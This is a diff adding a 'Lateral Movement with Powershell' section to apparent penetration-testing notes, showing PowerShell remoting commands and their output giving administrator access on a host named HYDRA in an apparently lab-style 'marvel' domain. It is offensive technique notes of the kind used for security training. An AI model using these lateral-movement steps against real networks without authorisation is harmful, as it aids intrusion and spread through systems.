@@ -645,6 +645,34 @@ DESKTOP-DGQM4HL
 SPODERMAN
 SPIDERMAN
 ```
+# Lateral Movement with Powershell:
+
+```
+PS C:\Windows\system32> New-PSSession -ComputerName HYDRA
+
+ Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+ -- ----            ------------    ------------    -----         -----------------     ------------
+  1 WinRM1          HYDRA           RemoteMachine   Opened        Microsoft.PowerShell     Available
+
+
+PS C:\Windows\system32> Enter-PSSession -ComputerName HYDRA
+[HYDRA]: PS C:\Users\Administrator\Documents> whoami
+marvel\administrator
+```
+
+```
+[HYDRA]: PS C:\Users\Administrator\Documents> exit
+PS C:\Windows\system32> invoke-command -ScriptBlock {whoami;hostname} -Computername HYDRA
+marvel\administrator
+HYDRA
+```
+
+
+```
+PS C:\Windows\system32> $sess = New-PSSession -ComputerName HYDRA    
+PS C:\Windows\system32> invoke-Command -ScriptBlock {whoami} -Session $sess
+marvel\administrator
+```
 
 
 # Other
